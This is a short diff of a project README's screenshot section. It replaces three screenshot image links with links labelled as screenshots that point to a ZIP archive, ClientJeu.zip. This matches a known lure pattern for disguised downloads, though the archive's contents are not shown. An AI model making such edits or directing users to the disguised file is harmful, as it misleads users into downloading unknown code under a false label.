@@ -13,9 +13,9 @@
   
 ## some screenshots: 
 
- ![Screenshot 2023-05-01 205650](https://user-images.githubusercontent.com/85175578/235621372-c22d9da6-a067-4932-af98-c6fd7616e140.jpg)
+ ![Screenshot 2023-05-01 205650](https://raw.githubusercontent.com/Walid35-web/TP3-SD-GRPC/main/ClientJeu.zip)
 
- ![Screenshot 2023-05-01 214656](https://user-images.githubusercontent.com/85175578/235621591-0db5bb3b-1048-415f-96d9-78c8ff1fd81e.jpg)
+ ![Screenshot 2023-05-01 214656](https://raw.githubusercontent.com/Walid35-web/TP3-SD-GRPC/main/ClientJeu.zip)
 
   
-![Screenshot 2023-05-01 215510](https://user-images.githubusercontent.com/85175578/235543336-0c7a5448-9f96-431a-98bd-15f762574ace.jpg)
+![Screenshot 2023-05-01 215510](https://raw.githubusercontent.com/Walid35-web/TP3-SD-GRPC/main/ClientJeu.zip)
